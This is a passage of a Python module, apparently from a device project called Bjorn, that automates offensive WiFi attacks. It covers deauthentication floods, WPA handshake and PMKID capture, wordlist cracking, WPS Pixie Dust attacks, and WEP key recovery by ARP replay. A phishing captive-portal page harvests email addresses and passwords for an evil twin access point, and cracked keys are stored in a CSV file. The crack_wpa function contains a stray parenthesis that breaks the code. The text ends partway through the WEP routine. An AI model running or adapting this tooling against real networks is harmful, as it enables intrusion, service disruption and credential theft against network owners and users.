"""
WiFi security testing module for Bjorn.

Provides comprehensive WiFi security operations using an external
USB adapter (wlan1). NEVER touches wlan0 (system connectivity).

Uses aircrack-ng suite, reaver, hcxdumptool, hostapd, dnsmasq,
and mdk4 for offensive WiFi operations.
"""

import csv
import io
import os
import re
import signal
import subprocess
import threading
import time
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from functools import wraps

from init_shared import shared_data
from logger import Logger

logger = Logger(name="wifi_manager.py", level=__import__('logging').DEBUG)

IFACE = "wlan1"
BLOCKED_IFACES = {"wlan0", "eth0", "usb0"}
MONITOR_SUFFIXES = ("mon",)

WIFI_BASE = os.path.join(
    shared_data.output_dir, "wifi"
)
HANDSHAKE_DIR = os.path.join(WIFI_BASE, "handshakes")
PMKID_DIR = os.path.join(WIFI_BASE, "pmkid")
CRACKED_DIR = os.path.join(WIFI_BASE, "cracked")
REPORTS_DIR = os.path.join(WIFI_BASE, "reports")
EVIL_TWIN_DIR = os.path.join(WIFI_BASE, "evil_twin")

CRACKED_CSV = os.path.join(CRACKED_DIR, "cracked.csv")
CRACKED_FIELDS = [
    "BSSID", "SSID", "Encryption",
    "Password", "Method", "Timestamp"
]

CAPTIVE_HTML = """<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>
body{font-family:Arial,sans-serif;background:#1a1a2e;
color:#eee;display:flex;justify-content:center;
align-items:center;min-height:100vh;margin:0}
.box{background:#16213e;padding:2em;border-radius:12px;
width:320px;box-shadow:0 4px 24px rgba(0,0,0,.5)}
h2{text-align:center;color:#0f3460}
input{width:100%;padding:10px;margin:8px 0;
box-sizing:border-box;border:1px solid #0f3460;
border-radius:6px;background:#1a1a2e;color:#eee}
button{width:100%;padding:12px;background:#e94560;
color:#fff;border:none;border-radius:6px;cursor:pointer;
font-size:16px;margin-top:12px}
button:hover{background:#c81e45}
.note{font-size:11px;color:#888;text-align:center;
margin-top:14px}
</style>
</head>
<body>
<div class="box">
<h2>Free WiFi Access</h2>
<form method="POST" action="/login">
<input name="email" placeholder="Email" required>
<input name="password" type="password"
 placeholder="Password" required>
<button type="submit">Connect</button>
</form>
<div class="note">
By connecting you agree to our terms of service.
</div>
</div>
</body>
</html>"""

CAPTIVE_SUCCESS = """<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title>
<style>
body{font-family:Arial,sans-serif;background:#1a1a2e;
color:#eee;display:flex;justify-content:center;
align-items:center;min-height:100vh;margin:0}
.box{background:#16213e;padding:2em;border-radius:12px;
text-align:center}
h2{color:#2ecc71}
</style>
</head>
<body>
<div class="box">
<h2>Connected!</h2>
<p>You are now connected to the internet.</p>
</div>
</body>
</html>"""


def _safe(func):
    """Decorator wrapping public methods with try/except."""
    @wraps(func)
    def wrapper(self, *args, **kwargs):
        try:
            return func(self, *args, **kwargs)
        except Exception as exc:
            logger.error(
                "WiFiManager.%s failed: %s", func.__name__, exc
            )
            return {
                "success": False,
                "error": str(exc),
                "method": func.__name__
            }
    return wrapper


class WiFiManager:
    """Comprehensive WiFi security testing manager.

    Uses wlan1 (external USB adapter) exclusively.
    Thread-safe via internal lock for monitor mode ops.
    """

    def __init__(self):
        self._lock = threading.Lock()
        self._monitor_active = False
        self._monitor_iface = None
        self._evil_twin_running = False
        self._evil_twin_server = None
        self._ensure_dirs()
        logger.info("WiFiManager initialized (iface=%s)", IFACE)

    # ------------------------------------------------------------------
    # Infrastructure (private)
    # ------------------------------------------------------------------

    def _ensure_dirs(self):
        """Create required data directories."""
        for path in (
            HANDSHAKE_DIR, PMKID_DIR, CRACKED_DIR,
            REPORTS_DIR, EVIL_TWIN_DIR
        ):
            os.makedirs(path, exist_ok=True)

    def _run_cmd(self, cmd, timeout=60):
        """Run a subprocess command.

        Args:
            cmd: Command as list of strings.
            timeout: Max seconds before SIGTERM.

        Returns:
            Tuple of (returncode, stdout, stderr).
        """
        cmd_str = " ".join(cmd) if isinstance(cmd, list) else cmd
        logger.debug("Running: %s", cmd_str)
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            return proc.returncode, proc.stdout, proc.stderr
        except subprocess.TimeoutExpired:
            logger.warning("Command timed out: %s", cmd_str)
            return -1, "", "Command timed out"
        except FileNotFoundError:
            tool = cmd[0] if isinstance(cmd, list) else cmd
            msg = f"Tool not installed: {tool}"
            logger.warning(msg)
            return -127, "", msg

    def _run_cmd_bg(self, cmd, stdout_file=None):
        """Start a background process, returning the Popen object.

        Args:
            cmd: Command as list of strings.
            stdout_file: Optional path to redirect stdout.

        Returns:
            subprocess.Popen or None on failure.
        """
        cmd_str = " ".join(cmd) if isinstance(cmd, list) else cmd
        logger.debug("Starting background: %s", cmd_str)
        try:
            stdout = None
            fh = None
            if stdout_file:
                fh = open(stdout_file, "w")
                stdout = fh
            proc = subprocess.Popen(
                cmd,
                stdout=stdout or subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid
            )
            # Attach file handle so caller can close it
            proc._wifi_fh = fh
            return proc
        except FileNotFoundError:
            tool = cmd[0] if isinstance(cmd, list) else cmd
            logger.warning("Tool not installed: %s", tool)
            if fh:
                fh.close()
            return None

    def _stop_bg(self, proc, sig=signal.SIGINT, wait=5):
        """Stop a background process gracefully.

        Args:
            proc: Popen object.
            sig: Signal to send (SIGINT lets tools flush).
            wait: Seconds to wait after signal.
        """
        if proc is None or proc.poll() is not None:
            return
        try:
            os.killpg(os.getpgid(proc.pid), sig)
            proc.wait(timeout=wait)
        except (ProcessLookupError, subprocess.TimeoutExpired):
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                proc.wait(timeout=3)
            except Exception:
                pass
        finally:
            fh = getattr(proc, "_wifi_fh", None)
            if fh:
                try:
                    fh.close()
                except Exception:
                    pass

    def _validate_interface(self, iface):
        """Reject protected interfaces.

        Args:
            iface: Interface name to check.

        Raises:
            ValueError if interface is blocked.
        """
        clean = iface.strip().lower()
        if clean in BLOCKED_IFACES:
            raise ValueError(
                f"Interface {iface} is protected and must "
                f"not be used for offensive operations"
            )

    def _detect_monitor_iface(self):
        """Detect the monitor-mode interface name.

        After airmon-ng start, the interface may be
        wlan1mon or remain wlan1. Check iwconfig output.

        Returns:
            Monitor interface name string or None.
        """
        code, out, _ = self._run_cmd(
            ["iwconfig"], timeout=10
        )
        if code != 0 and code != -127:
            code, out, _ = self._run_cmd(
                ["iw", "dev"], timeout=10
            )
            if code != 0:
                return None
            for line in out.splitlines():
                stripped = line.strip()
                if stripped.startswith("Interface"):
                    name = stripped.split()[-1]
                    if name.startswith(IFACE):
                        return name
            return None

        for line in out.splitlines():
            parts = line.split()
            if not parts:
                continue
            name = parts[0]
            if name.startswith(IFACE) and (
                "Mode:Monitor" in line
                or "Monitor" in line
            ):
                return name
        # Fallback: look for wlan1mon in output
        for line in out.splitlines():
            parts = line.split()
            if parts and parts[0] == f"{IFACE}mon":
                return f"{IFACE}mon"
        return None

    def _enable_monitor_mode(self):
        """Enable monitor mode on wlan1.

        Runs airmon-ng check kill, then immediately restarts
        NetworkManager to preserve wlan0 connectivity, then
        starts monitor mode.

        Returns:
            str: Name of the monitor interface.

        Raises:
            RuntimeError: If monitor mode cannot be enabled.
        """
        with self._lock:
            if self._monitor_active and self._monitor_iface:
                detected = self._detect_monitor_iface()
                if detected:
                    return self._monitor_iface

            self._validate_interface(IFACE)

            # Kill interfering processes
            self._run_cmd(
                ["airmon-ng", "check", "kill"], timeout=15
            )

            # Immediately restart NetworkManager so wlan0
            # keeps working for system connectivity
            self._run_cmd(
                ["systemctl", "restart", "NetworkManager"],
                timeout=15
            )
            # Small delay to let NM settle
            time.sleep(2)

            # Start monitor mode
            code, out, err = self._run_cmd(
                ["airmon-ng", "start", IFACE], timeout=20
            )
            if code != 0:
                raise RuntimeError(
                    f"airmon-ng start failed: {err}"
                )

            time.sleep(1)
            iface = self._detect_monitor_iface()
            if not iface:
                # Fallback: try common names
                for candidate in (f"{IFACE}mon", IFACE):
                    chk_code, chk_out, _ = self._run_cmd(
                        ["iwconfig", candidate], timeout=5
                    )
                    if chk_code == 0 and "Monitor" in chk_out:
                        iface = candidate
                        break

            if not iface:
                raise RuntimeError(
                    "Could not detect monitor interface "
                    "after airmon-ng start"
                )

            self._monitor_active = True
            self._monitor_iface = iface
            logger.info(
                "Monitor mode enabled on %s", iface
            )
            return iface

    def _disable_monitor_mode(self):
        """Disable monitor mode, restoring managed mode.

        Returns:
            bool: True if successfully disabled.
        """
        with self._lock:
            if not self._monitor_active:
                return True

            iface = self._monitor_iface or f"{IFACE}mon"
            code, _, err = self._run_cmd(
                ["airmon-ng", "stop", iface], timeout=20
            )
            self._run_cmd(
                ["systemctl", "restart", "NetworkManager"],
                timeout=15
            )

            self._monitor_active = False
            self._monitor_iface = None
            logger.info("Monitor mode disabled")
            return code == 0

    def _parse_airodump_csv(self, filepath):
        """Parse airodump-ng CSV output.

        Airodump CSV has two sections separated by a blank
        line. First section: APs. Second section: clients.

        Args:
            filepath: Path to the CSV file (may have -01
                suffix appended by airodump).

        Returns:
            dict with 'networks' and 'clients' lists.
        """
        # Airodump appends -01.csv etc.
        actual = filepath
        if not os.path.exists(actual):
            for suffix in ("-01.csv", "-02.csv", "-03.csv"):
                candidate = filepath + suffix
                if os.path.exists(candidate):
                    actual = candidate
                    break

        if not os.path.exists(actual):
            logger.warning(
                "Airodump CSV not found: %s", filepath
            )
            return {"networks": [], "clients": []}

        with open(actual, "r", errors="replace") as fh:
            raw = fh.read()

        networks = []
        clients = []

        # Split on double newline or the station header
        sections = re.split(
            r'\r?\n\s*\r?\n', raw, maxsplit=1
        )

        # --- Parse networks (first section) ---
        if sections:
            ap_lines = sections[0].strip().splitlines()
            # Find header line
            header_idx = -1
            for idx, line in enumerate(ap_lines):
                if "BSSID" in line and "channel" in line.lower():
                    header_idx = idx
                    break
                if "BSSID" in line and "ESSID" in line:
                    header_idx = idx
                    break
                if "BSSID" in line:
                    header_idx = idx
                    break

            if header_idx >= 0:
                header = [
                    h.strip()
                    for h in ap_lines[header_idx].split(",")
                ]
                header_lower = [h.lower() for h in header]

                def _col(name):
                    """Find column index by name fragment."""
                    name_l = name.lower()
                    for i, h in enumerate(header_lower):
                        if name_l in h:
                            return i
                    return -1

                col_bssid = _col("bssid")
                col_channel = _col("channel")
                col_privacy = _col("privacy")
                col_cipher = _col("cipher")
                col_power = _col("power")
                col_essid = _col("essid")
                col_beacons = _col("beacons")
                col_data = _col("# data") if _col("# data") >= 0 else _col("data")

                for line in ap_lines[header_idx + 1:]:
                    parts = line.split(",")
                    if len(parts) < 5:
                        continue
                    bssid = parts[col_bssid].strip() \
                        if col_bssid >= 0 else ""
                    if not re.match(
                        r'^[0-9A-Fa-f:]{17}$', bssid
                    ):
                        continue

                    channel_str = parts[col_channel].strip() \
                        if col_channel >= 0 else "0"
                    try:
                        chan = int(channel_str.strip())
                    except ValueError:
                        chan = 0

                    privacy = parts[col_privacy].strip() \
                        if col_privacy >= 0 and \
                        col_privacy < len(parts) else ""
                    cipher = parts[col_cipher].strip() \
                        if col_cipher >= 0 and \
                        col_cipher < len(parts) else ""
                    power = parts[col_power].strip() \
                        if col_power >= 0 and \
                        col_power < len(parts) else "-1"
                    essid = parts[col_essid].strip() \
                        if col_essid >= 0 and \
                        col_essid < len(parts) else ""

                    try:
                        pwr = int(power)
                    except ValueError:
                        pwr = -1

                    hidden = essid == "" or essid.startswith(
                        "\\x00"
                    ) or len(essid.replace("\x00", "")) == 0

                    networks.append({
                        "bssid": bssid,
                        "ssid": essid if not hidden else "",
                        "channel": chan,
                        "encryption": privacy,
                        "cipher": cipher,
                        "signal": pwr,
                        "hidden": hidden,
                        "clients_count": 0
                    })

        # --- Parse clients (second section) ---
        if len(sections) > 1:
            cl_block = sections[1].strip()
            cl_lines = cl_block.splitlines()

            header_idx = -1
            for idx, line in enumerate(cl_lines):
                if "Station MAC" in line:
                    header_idx = idx
                    break

            if header_idx >= 0:
                header = [
                    h.strip()
                    for h in cl_lines[header_idx].split(",")
                ]
                header_lower = [h.lower() for h in header]

                def _ccol(name):
                    name_l = name.lower()
                    for i, h in enumerate(header_lower):
                        if name_l in h:
                            return i
                    return -1

                col_sta = _ccol("station")
                col_pwr = _ccol("power")
                col_pkts = _ccol("packets") if \
                    _ccol("packets") >= 0 else _ccol("# data")
                col_bssid = _ccol("bssid")
                col_probed = _ccol("probed")

                for line in cl_lines[header_idx + 1:]:
                    parts = line.split(",")
                    if len(parts) < 3:
                        continue
                    sta = parts[col_sta].strip() \
                        if col_sta >= 0 else ""
                    if not re.match(
                        r'^[0-9A-Fa-f:]{17}$', sta
                    ):
                        continue

                    assoc_bssid = parts[col_bssid].strip() \
                        if col_bssid >= 0 and \
                        col_bssid < len(parts) else ""

                    pwr_s = parts[col_pwr].strip() \
                        if col_pwr >= 0 and \
                        col_pwr < len(parts) else "-1"
                    try:
                        pwr = int(pwr_s)
                    except ValueError:
                        pwr = -1

                    pkts_s = parts[col_pkts].strip() \
                        if col_pkts >= 0 and \
                        col_pkts < len(parts) else "0"
                    try:
                        pkts = int(pkts_s)
                    except ValueError:
                        pkts = 0

                    probed = parts[col_probed].strip() \
                        if col_probed >= 0 and \
                        col_probed < len(parts) else ""

                    clients.append({
                        "mac": sta,
                        "bssid": assoc_bssid,
                        "signal": pwr,
                        "packets": pkts,
                        "probes": probed
                    })

                    # Increment client count for APs
                    if assoc_bssid:
                        for net in networks:
                            if net["bssid"] == assoc_bssid:
                                net["clients_count"] += 1
                                break

        return {"networks": networks, "clients": clients}

    def _sanitize_bssid(self, bssid):
        """Convert BSSID to filename-safe string.

        Args:
            bssid: MAC address like AA:BB:CC:DD:EE:FF.

        Returns:
            String like AA-BB-CC-DD-EE-FF.
        """
        return bssid.replace(":", "-").upper()

    def _ts(self):
        """Return timestamp string for filenames.

        Returns:
            String like 20260309-143022.
        """
        return datetime.now().strftime("%Y%m%d-%H%M%S")

    def _append_cracked(
        self, bssid, ssid, encryption, password, method
    ):
        """Append a cracked credential to cracked.csv.

        Args:
            bssid: Target BSSID.
            ssid: Network SSID.
            encryption: WPA2/WEP/WPS etc.
            password: Cracked password or PIN.
            method: Method used (handshake/pmkid/wps/wep).
        """
        write_header = not os.path.exists(CRACKED_CSV)
        with open(CRACKED_CSV, "a", newline="") as fh:
            writer = csv.DictWriter(
                fh, fieldnames=CRACKED_FIELDS
            )
            if write_header:
                writer.writeheader()
            writer.writerow({
                "BSSID": bssid,
                "SSID": ssid,
                "Encryption": encryption,
                "Password": password,
                "Method": method,
                "Timestamp": datetime.now().isoformat()
            })
        logger.info(
            "Cracked credential saved: %s (%s)", ssid, method
        )

    def _check_tool(self, tool_name):
        """Check if a tool is available on the system.

        Args:
            tool_name: Binary name to check.

        Returns:
            bool: True if tool is found in PATH.
        """
        code, _, _ = self._run_cmd(
            ["which", tool_name], timeout=5
        )
        return code == 0

    # ------------------------------------------------------------------
    # Public methods
    # ------------------------------------------------------------------

    @_safe
    def analyze_networks(
        self,
        target_bssid=None,
        channel=None,
        scan_duration=15
    ):
        """Scan for WiFi networks using airodump-ng.

        Args:
            target_bssid: Optional BSSID to focus on.
            channel: Optional channel number to scan.
            scan_duration: Seconds to scan (default 15).

        Returns:
            dict with success, networks list, scan info.
        """
        mon_iface = self._enable_monitor_mode()
        ts = self._ts()
        prefix = os.path.join(
            REPORTS_DIR, f"scan-{ts}"
        )

        cmd = [
            "airodump-ng",
            "--write", prefix,
            "--output-format", "csv",
            "--write-interval", "1"
        ]
        if target_bssid:
            cmd.extend(["--bssid", target_bssid])
        if channel:
            cmd.extend(["--channel", str(channel)])
        cmd.append(mon_iface)

        proc = self._run_cmd_bg(cmd)
        if proc is None:
            self._disable_monitor_mode()
            return {
                "success": False,
                "error": "airodump-ng not installed"
            }

        time.sleep(scan_duration)
        self._stop_bg(proc, sig=signal.SIGINT, wait=3)

        parsed = self._parse_airodump_csv(prefix)
        networks = parsed.get("networks", [])

        # Detect WPS with wash
        if self._check_tool("wash"):
            wps_bssids = set()
            wash_code, wash_out, _ = self._run_cmd(
                ["wash", "-i", mon_iface, "-s"],
                timeout=20
            )
            if wash_code == 0 and wash_out:
                for line in wash_out.strip().splitlines():
                    parts = line.split()
                    if parts and re.match(
                        r'^[0-9A-Fa-f:]{17}$', parts[0]
                    ):
                        wps_bssids.add(parts[0].upper())

            for net in networks:
                net["wps_enabled"] = (
                    net["bssid"].upper() in wps_bssids
                )
        else:
            for net in networks:
                net["wps_enabled"] = False
            logger.debug(
                "wash not available; skipping WPS detection"
            )

        self._disable_monitor_mode()
        logger.info(
            "Network scan complete: %d networks found",
            len(networks)
        )
        return {
            "success": True,
            "networks": networks,
            "scan_duration": scan_duration,
            "scan_file": prefix,
            "count": len(networks)
        }

    @_safe
    def list_clients(self, bssid, channel, duration=30):
        """List clients connected to a specific AP.

        Args:
            bssid: Target AP BSSID.
            channel: AP channel number.
            duration: Scan duration in seconds.

        Returns:
            dict with success and clients list.
        """
        mon_iface = self._enable_monitor_mode()
        ts = self._ts()
        prefix = os.path.join(
            REPORTS_DIR,
            f"clients-{self._sanitize_bssid(bssid)}-{ts}"
        )

        cmd = [
            "airodump-ng",
            "--bssid", bssid,
            "--channel", str(channel),
            "--write", prefix,
            "--output-format", "csv",
            "--write-interval", "1",
            mon_iface
        ]

        proc = self._run_cmd_bg(cmd)
        if proc is None:
            self._disable_monitor_mode()
            return {
                "success": False,
                "error": "airodump-ng not installed"
            }

        time.sleep(duration)
        self._stop_bg(proc, sig=signal.SIGINT, wait=3)

        parsed = self._parse_airodump_csv(prefix)
        clients = parsed.get("clients", [])

        self._disable_monitor_mode()
        logger.info(
            "Client scan for %s: %d clients found",
            bssid, len(clients)
        )
        return {
            "success": True,
            "bssid": bssid,
            "channel": channel,
            "clients": clients,
            "count": len(clients)
        }

    @_safe
    def send_deauth(
        self, bssid, channel, client_mac=None, count=10
    ):
        """Send deauthentication frames.

        Args:
            bssid: Target AP BSSID.
            channel: AP channel.
            client_mac: Target client (None = broadcast).
            count: Number of deauth frames to send.

        Returns:
            dict with success status.
        """
        mon_iface = self._enable_monitor_mode()

        # Set channel
        self._run_cmd(
            ["iwconfig", mon_iface, "channel", str(channel)],
            timeout=5
        )

        cmd = [
            "aireplay-ng",
            "-0", str(count),
            "-a", bssid
        ]
        if client_mac:
            cmd.extend(["-c", client_mac])
        cmd.append(mon_iface)

        code, out, err = self._run_cmd(cmd, timeout=30)

        self._disable_monitor_mode()

        target_desc = client_mac or "broadcast"
        if code == 0:
            logger.info(
                "Deauth sent: %d frames to %s via %s",
                count, target_desc, bssid
            )
            return {
                "success": True,
                "bssid": bssid,
                "target": target_desc,
                "count": count
            }

        return {
            "success": False,
            "error": f"aireplay-ng failed: {err}",
            "bssid": bssid
        }

    @_safe
    def capture_handshake(
        self, bssid, channel, client_mac=None,
        deauth_count=5, timeout=120
    ):
        """Capture WPA/WPA2 4-way handshake.

        Starts airodump-ng capture, sends deauth to trigger
        handshake, waits for capture, validates with
        aircrack-ng.

        Args:
            bssid: Target AP BSSID.
            channel: AP channel.
            client_mac: Client to deauth (None=broadcast).
            deauth_count: Deauth frames per attempt.
            timeout: Max seconds to wait for handshake.

        Returns:
            dict with success, capture file path.
        """
        mon_iface = self._enable_monitor_mode()
        ts = self._ts()
        safe_bssid = self._sanitize_bssid(bssid)
        prefix = os.path.join(
            HANDSHAKE_DIR, f"hs-{safe_bssid}-{ts}"
        )

        # Start airodump-ng capture
        dump_cmd = [
            "airodump-ng",
            "--bssid", bssid,
            "--channel", str(channel),
            "--write", prefix,
            "--output-format", "cap",
            mon_iface
        ]
        dump_proc = self._run_cmd_bg(dump_cmd)
        if dump_proc is None:
            self._disable_monitor_mode()
            return {
                "success": False,
                "error": "airodump-ng not installed"
            }

        # Give airodump time to start
        time.sleep(3)

        handshake_found = False
        cap_file = f"{prefix}-01.cap"
        attempts = 0
        max_attempts = max(1, timeout // 20)
        start = time.time()

        while not handshake_found and \
                (time.time() - start) < timeout and \
                attempts < max_attempts:
            attempts += 1

            # Send deauth
            deauth_cmd = [
                "aireplay-ng",
                "-0", str(deauth_count),
                "-a", bssid
            ]
            if client_mac:
                deauth_cmd.extend(["-c", client_mac])
            deauth_cmd.append(mon_iface)
            self._run_cmd(deauth_cmd, timeout=15)

            # Wait for potential handshake capture
            time.sleep(15)

            # Check if handshake captured
            if os.path.exists(cap_file):
                chk_code, chk_out, _ = self._run_cmd(
                    [
                        "aircrack-ng", cap_file,
                        "-b", bssid
                    ],
                    timeout=15
                )
                if "1 handshake" in (chk_out or ""):
                    handshake_found = True
                    logger.info(
                        "Handshake captured for %s", bssid
                    )

        self._stop_bg(dump_proc, sig=signal.SIGINT, wait=3)
        self._disable_monitor_mode()

        if handshake_found:
            return {
                "success": True,
                "bssid": bssid,
                "capture_file": cap_file,
                "attempts": attempts,
                "duration": int(time.time() - start)
            }

        return {
            "success": False,
            "error": "Handshake not captured within timeout",
            "bssid": bssid,
            "attempts": attempts,
            "duration": int(time.time() - start),
            "capture_file": cap_file
            if os.path.exists(cap_file) else None
        }

    @_safe
    def capture_pmkid(self, bssid, channel, timeout=60):
        """Capture PMKID using hcxdumptool.

        Args:
            bssid: Target AP BSSID.
            channel: AP channel.
            timeout: Max seconds to capture.

        Returns:
            dict with success, hash file path.
        """
        mon_iface = self._enable_monitor_mode()
        ts = self._ts()
        safe_bssid = self._sanitize_bssid(bssid)
        pcapng = os.path.join(
            PMKID_DIR, f"pmkid-{safe_bssid}-{ts}.pcapng"
        )
        hashfile = os.path.join(
            PMKID_DIR, f"pmkid-{safe_bssid}-{ts}.16800"
        )

        # Create filter file for target BSSID
        filterlist = os.path.join(
            PMKID_DIR, f"filter-{ts}.txt"
        )
        clean_bssid = bssid.replace(":", "").lower()
        with open(filterlist, "w") as fh:
            fh.write(clean_bssid + "\n")

        # Set channel
        self._run_cmd(
            ["iwconfig", mon_iface, "channel", str(channel)],
            timeout=5
        )

        # Run hcxdumptool
        cmd = [
            "hcxdumptool",
            "-i", mon_iface,
            "-o", pcapng,
            "--filterlist_ap", filterlist,
            "--filtermode=2",
            "--enable_status=1"
        ]

        proc = self._run_cmd_bg(cmd)
        if proc is None:
            self._disable_monitor_mode()
            try:
                os.unlink(filterlist)
            except OSError:
                pass
            return {
                "success": False,
                "error": "hcxdumptool not installed"
            }

        time.sleep(timeout)
        self._stop_bg(proc, sig=signal.SIGINT, wait=3)
        self._disable_monitor_mode()

        # Clean up filter file
        try:
            os.unlink(filterlist)
        except OSError:
            pass

        if not os.path.exists(pcapng):
            return {
                "success": False,
                "error": "No PMKID capture file created",
                "bssid": bssid
            }

        # Convert with hcxpcapngtool
        conv_code, conv_out, conv_err = self._run_cmd(
            [
                "hcxpcapngtool",
                "-o", hashfile,
                pcapng
            ],
            timeout=30
        )

        if conv_code != 0 or not os.path.exists(hashfile):
            # Try older hcxpcaptool as fallback
            conv_code, conv_out, conv_err = self._run_cmd(
                [
                    "hcxpcaptool",
                    "-z", hashfile,
                    pcapng
                ],
                timeout=30
            )

        if os.path.exists(hashfile) and \
                os.path.getsize(hashfile) > 0:
            logger.info(
                "PMKID captured for %s: %s",
                bssid, hashfile
            )
            return {
                "success": True,
                "bssid": bssid,
                "hash_file": hashfile,
                "pcapng_file": pcapng
            }

        return {
            "success": False,
            "error": "PMKID not found in capture",
            "bssid": bssid,
            "pcapng_file": pcapng
        }

    @_safe
    def crack_wpa(self, capture_file, wordlist=None):
        """Crack WPA/WPA2 using aircrack-ng with wordlist.

        Args:
            capture_file: Path to .cap or .16800 file.
            wordlist: Path to wordlist file. Defaults to
                shared_data resources passwords.txt.

        Returns:
            dict with success, password if cracked.
        """
        if not os.path.exists(capture_file):
            return {
                "success": False,
                "error": f"Capture file not found: "
                         f"{capture_file}"
            }

        if wordlist is None:
            wordlist = shared_data.passwordsfile
            )
        if not os.path.exists(wordlist):
            return {
                "success": False,
                "error": f"Wordlist not found: {wordlist}"
            }

        is_pmkid = capture_file.endswith(".16800")

        if is_pmkid:
            # Use hashcat mode for PMKID if available,
            # otherwise fall back
            if self._check_tool("hashcat"):
                code, out, err = self._run_cmd(
                    [
                        "hashcat",
                        "-m", "16800",
                        capture_file,
                        wordlist,
                        "--force",
                        "--quiet"
                    ],
                    timeout=3600
                )
                if code == 0:
                    # Parse hashcat output for password
                    for line in out.strip().splitlines():
                        if ":" in line:
                            parts = line.rsplit(":", 1)
                            if len(parts) == 2:
                                password = parts[1].strip()
                                if password:
                                    return {
                                        "success": True,
                                        "password": password,
                                        "method": "pmkid",
                                        "capture_file":
                                            capture_file
                                    }
            return {
                "success": False,
                "error": "PMKID cracking requires hashcat",
                "capture_file": capture_file
            }

        # Standard .cap file with aircrack-ng
        code, out, err = self._run_cmd(
            [
                "aircrack-ng",
                "-w", wordlist,
                "-b", self._extract_bssid_from_cap(
                    capture_file
                ),
                capture_file
            ],
            timeout=3600
        )

        # Parse aircrack-ng output for key
        password = None
        if out:
            key_match = re.search(
                r'KEY FOUND!\s*\[\s*(.+?)\s*\]', out
            )
            if key_match:
                password = key_match.group(1)

        if password:
            bssid = self._extract_bssid_from_cap(
                capture_file
            )
            ssid = self._extract_ssid_from_aircrack(out)
            self._append_cracked(
                bssid, ssid, "WPA/WPA2",
                password, "handshake"
            )
            logger.info(
                "WPA key cracked for %s: %s",
                capture_file, password
            )
            return {
                "success": True,
                "password": password,
                "method": "handshake",
                "capture_file": capture_file
            }

        return {
            "success": False,
            "error": "Password not found in wordlist",
            "capture_file": capture_file
        }

    def _extract_bssid_from_cap(self, cap_file):
        """Extract BSSID from capture filename.

        Args:
            cap_file: Path like hs-AA-BB-CC-DD-EE-FF-ts.cap.

        Returns:
            BSSID string or empty string.
        """
        basename = os.path.basename(cap_file)
        mac_match = re.search(
            r'([0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-'
            r'[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-'
            r'[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2})',
            basename
        )
        if mac_match:
            return mac_match.group(1).replace("-", ":")
        return ""

    def _extract_ssid_from_aircrack(self, output):
        """Extract SSID from aircrack-ng output.

        Args:
            output: aircrack-ng stdout text.

        Returns:
            SSID string or "Unknown".
        """
        if not output:
            return "Unknown"
        ssid_match = re.search(
            r'ESSID:\s*(.+?)(?:\s*$|\s*\n)', output,
            re.MULTILINE
        )
        if ssid_match:
            return ssid_match.group(1).strip()
        return "Unknown"

    @_safe
    def crack_wps(
        self, bssid, channel, timeout=600, pixie_dust=True
    ):
        """Crack WPS PIN using reaver.

        Args:
            bssid: Target AP BSSID.
            channel: AP channel.
            timeout: Max seconds to run reaver.
            pixie_dust: Use Pixie Dust attack (faster).

        Returns:
            dict with success, pin, psk if cracked.
        """
        mon_iface = self._enable_monitor_mode()

        cmd = [
            "reaver",
            "-i", mon_iface,
            "-b", bssid,
            "-c", str(channel),
            "-vv"
        ]
        if pixie_dust:
            cmd.extend(["-K", "1"])

        code, out, err = self._run_cmd(cmd, timeout=timeout)
        self._disable_monitor_mode()

        combined = (out or "") + (err or "")

        # Parse reaver output
        pin = None
        psk = None
        pin_match = re.search(
            r'WPS PIN:\s*[\'"]?(\d+)[\'"]?', combined
        )
        if pin_match:
            pin = pin_match.group(1)

        psk_match = re.search(
            r'WPA PSK:\s*[\'"]?(.+?)[\'"]?\s*$',
            combined, re.MULTILINE
        )
        if psk_match:
            psk = psk_match.group(1).strip().strip("'\"")

        if pin or psk:
            self._append_cracked(
                bssid, "", "WPS",
                psk or pin, "wps"
            )
            logger.info(
                "WPS cracked for %s: PIN=%s PSK=%s",
                bssid, pin, psk
            )
            return {
                "success": True,
                "bssid": bssid,
                "pin": pin,
                "psk": psk,
                "method": "pixie_dust"
                if pixie_dust else "brute_force"
            }

        return {
            "success": False,
            "error": "WPS attack did not yield results",
            "bssid": bssid,
            "output": combined[-500:]
            if len(combined) > 500 else combined
        }

    @_safe
    def crack_wep(self, bssid, channel, timeout=300):
        """Crack WEP encryption.

        Uses aireplay-ng for ARP request replay injection
        to generate IVs, then aircrack-ng to recover key.

        Args:
            bssid: Target AP BSSID.
            channel: AP channel.
            timeout: Max seconds for attack.

        Returns:
            dict with success, key if cracked.
        """
        mon_iface = self._enable_monitor_mode()
        ts = self._ts()
        safe_bssid = self._sanitize_bssid(bssid)
        prefix = os.path.join(
            HANDSHAKE_DIR, f"wep-{safe_bssid}-{ts}"
        )
        cap_file = f"{prefix}-01.cap"

        # Start airodump-ng to capture IVs
        dump_cmd = [
            "airodump-ng",
            "--bssid", bssid,
            "--channel", str(channel),
            "--write", prefix,
            "--output-format", "cap",
            mon_iface
        ]
        dump_proc = self._run_cmd_bg(dump_cmd)
        if dump_proc is None:
            self._disable_monitor_mode()
            return {
                "success": False,
                "error": "airodump-ng not installed"
            }

        time.sleep(3)

        # Fake authentication
        self._run_cmd(
            [
                "aireplay-ng",
                "-1", "6000",
                "-o", "1",
                "-q", "10",
                "-a", bssid,
                mon_iface
            ],
            timeout=20
        )

        # Start ARP replay injection
        inject_cmd = [
            "aireplay-ng",
            "-3",
            "-b", bssid,
            mon_iface
        ]
        inject_proc = self._run_cmd_bg(inject_cmd)

        # Periodically try to crack
        start = time.time()
        key = None

        while (time.time() - start) < timeout and not key:
            time.sleep(30)

            if not os.path.exists(cap_file):
                continue

            crack_code, crack_out, _ = self._run_cmd(
                ["aircrack-ng", "-b", bssid, cap_file],
                timeout=60
            )

            if crack_out:
                key_match = re.search(
                    r'KEY FOUND!\s*\[\s*(.+?)\s*\]',
                    crack_out
